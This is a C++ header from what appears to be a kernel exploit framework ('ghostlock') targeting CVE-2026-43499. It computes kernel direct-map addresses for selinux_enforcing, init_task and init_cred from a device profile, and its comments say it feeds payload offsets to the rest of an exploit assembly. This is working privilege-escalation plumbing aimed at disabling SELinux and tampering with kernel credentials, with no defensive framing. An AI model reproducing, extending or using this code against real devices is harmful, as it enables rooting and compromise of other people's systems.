#pragma once
/** @file backend/cve_2026_43499/layout_from_document.hpp
 *  Turning the document into the numbers an access lands on.
 *
 *  The retired procedure read three sections by name and walked every value it did not find back to a
 *  declared constant. This is the same read with the fallback removed: the numbers are data and the
 *  document is where they arrive, so a section that does not bridge is a refusal that names the field
 *  rather than a value nobody chose. That is the rule the retired comment states and the reason this
 *  file exists as its own unit -- it is the part of the assembly that touches no device at all, so it
 *  is complete and testable on the host while the rest of the assembly is not.
 *
 *  Two kinds of number live here and they are kept apart on purpose:
 *
 *   - What the document carries: the five payload offsets, the two kernel physical numbers, and the
 *     three image-relative field offsets. Absent means refused.
 *   - What the platform is: the four numbers of the image to direct-map translation. They are not in
 *     the document because they are properties of the kernel that was matched, and the retired tree
 *     established them twice over -- two by assertions in its own tests and two by four device logs
 *     that agree. The caller passes them in, so nothing here pretends to know them.
 */
#include <cstdint>
#include <string_view>

#include "backend/cve_2026_43499/abi.hpp"
#include "memory/target_profile.hpp"
#include "profile/document_pairs.hpp"
#include "profile/glkv3_document.hpp"

namespace ghostlock::backend::cve_2026_43499 {
    /** The four numbers of the image to direct-map translation, as the platform states them. */
    struct ImageArithmetic final {
        std::uint64_t image_text_base = 0U;
        std::uint64_t p0_page_offset = 0U;
        std::uint64_t phys_offset = 0U;
        std::uint64_t phys_load = 0U;
    };

    /** The retired tree arithmetic, line for line: image is the text base plus the offset, physical
     *  is the load plus that distance, and the direct address is the physical one rebased. A result of
     *  zero means the arithmetic did not apply, which the callers read as a refusal rather than as an
     *  address. */
    [[nodiscard]] constexpr std::uint64_t offset_to_direct(const ImageArithmetic &arithmetic,
                                                           std::uint64_t image_offset) noexcept {
        if (arithmetic.image_text_base == 0U) {
            return 0U;
        }
        const std::uint64_t image = arithmetic.image_text_base + image_offset;
        if (image < arithmetic.image_text_base) {
            return 0U;
        }
        const std::uint64_t physical = arithmetic.phys_load + (image - arithmetic.image_text_base);
        if (physical < arithmetic.phys_offset) {
            return 0U;
        }
        return (physical - arithmetic.phys_offset) | arithmetic.p0_page_offset;
    }

    /** What the document yielded. Absent sections are named, never substituted. */
    struct LayoutFromDocument final {
        PayloadOffsets payload{};
        std::uint64_t kernel_phys_load = 0U;
        std::uint64_t kernel_phys_offset = 0U;
        /** The three field offsets, already translated to direct-map addresses. */
        std::uint64_t selinux_enforcing = 0U;
        std::uint64_t init_task = 0U;
        std::uint64_t init_cred = 0U;
        bool ok = false;
        /** The first name that was missing or unusable, for the refusal to report. */
        const char *refused_field = nullptr;
    };

    /** Read the three sections and translate. A read that does not bridge stops the whole thing and
     *  names what it wanted, because a later step walking over a default is the failure this avoids. */
    [[nodiscard]] inline LayoutFromDocument layout_from_document(
        const profile::Document &document, const ImageArithmetic &arithmetic) noexcept {
        LayoutFromDocument out{};

        memory::KeyValue payload_pairs[kPayloadFieldCount] = {};
        const auto payload_read = profile::read_section_pairs(
            document, std::string_view("backend.cve_2026_43499.abi.payload"), kPayloadFields,
            kPayloadFieldCount, payload_pairs, kPayloadFieldCount);
        if (payload_read.verdict != profile::PairsVerdict::Ok) {
            out.refused_field = "abi.payload";
            return out;
        }
        const memory::KeyView payload_view{payload_pairs, payload_read.filled};
        const OffsetLookup filled = fill_payload_offsets(payload_view, out.payload);
        if (filled.verdict != AbiVerdict::Ok) {
            out.refused_field = filled.field != nullptr ? filled.field : "an unnamed payload field";
            return out;
        }

        memory::KeyValue kernel_pairs[2] = {};
        const char *const kernel_names[2] = {"kernel_phys_load", "kernel_phys_offset"};
        const auto kernel_read = profile::read_section_pairs(
            document, std::string_view("backend.cve_2026_43499.abi.kernel"), kernel_names, 2U,
            kernel_pairs, 2U);
        if (kernel_read.verdict != profile::PairsVerdict::Ok) {
            out.refused_field = "abi.kernel";
            return out;
        }
        out.kernel_phys_load = kernel_pairs[0].value;
        out.kernel_phys_offset = kernel_pairs[1].value;

        memory::KeyValue offset_pairs[3] = {};
        const char *const offset_names[3] = {"selinux_enforcing", "init_task", "init_cred"};
        const auto offset_read = profile::read_section_pairs(
            document, std::string_view("backend.cve_2026_43499.abi.offset"), offset_names, 3U,
            offset_pairs, 3U);
        if (offset_read.verdict != profile::PairsVerdict::Ok) {
            out.refused_field = "abi.offset";
            return out;
        }
        out.selinux_enforcing = offset_to_direct(arithmetic, offset_pairs[0].value);
        out.init_task = offset_to_direct(arithmetic, offset_pairs[1].value);
        out.init_cred = offset_to_direct(arithmetic, offset_pairs[2].value);
        if (out.selinux_enforcing == 0U || out.init_task == 0U || out.init_cred == 0U) {
            out.refused_field = "the image to direct-map translation";
            return out;
        }
        out.ok = true;
        return out;
    }
}  // namespace ghostlock::backend::cve_2026_43499
